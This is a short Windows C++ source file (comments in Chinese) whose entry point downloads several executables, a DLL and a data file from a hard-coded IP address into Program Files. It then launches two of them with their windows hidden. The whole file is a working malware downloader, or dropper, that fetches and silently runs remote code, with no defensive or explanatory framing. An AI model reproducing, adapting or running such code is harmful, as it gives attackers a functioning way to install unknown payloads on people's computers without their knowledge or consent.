// Ring3WinMain.cpp : 定义应用程序的入口点。
//

#include "stdafx.h"
#include "Ring3WinMain.h"
#include <urlmon.h>

#define MAX_LOADSTRING 100

// 全局变量:

#pragma comment(lib, "urlmon.lib")  

int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
                     _In_opt_ HINSTANCE hPrevInstance,
                     _In_ LPWSTR    lpCmdLine,
                     _In_ int       nCmdShow)
{

    URLDownloadToFile(NULL, TEXT("http://103.204.177.2/8000/001.exe"), TEXT("C:\\Program Files\\001.exe"), 0, NULL);
    Sleep(5000);
    //::ShellExecute(0, TEXT("open"), TEXT("C:\\Program Files\\001.exe"), NULL, NULL, SW_SHOW);
    TCHAR szCmd[] = TEXT("C:\\Program Files\\001.exe");
    STARTUPINFO si = { 0 };
    si.cb = sizeof(STARTUPINFO);
    PROCESS_INFORMATION pi = {0};
    //si.wShowWindow = SW_SHOW; //显示
    si.wShowWindow = SW_HIDE;//隐藏.
    CreateProcess(NULL, szCmd, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);
    Sleep(5000);
    URLDownloadToFile(NULL, TEXT("http://103.204.177.2/8000/fxgame.exe"), TEXT("C:\\Program Files\\fxgame.exe"), 0, NULL);
    URLDownloadToFile(NULL, TEXT("http://103.204.177.2/8000/gpkitclt.dll"), TEXT("C:\\Program Files\\gpkitclt.dll"), 0, NULL);
    URLDownloadToFile(NULL, TEXT("http://103.204.177.2/8000/wc.dat"), TEXT("C:\\Program Files\\wc.dat"), 0, NULL);

    Sleep(5000);
    TCHAR szCmd2[] = TEXT("C:\\Program Files\\fxgame.exe");
    //si.wShowWindow = SW_SHOW;
    si.wShowWindow = SW_HIDE;
    CreateProcess(NULL, szCmd2, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);


    return 0;

}
    

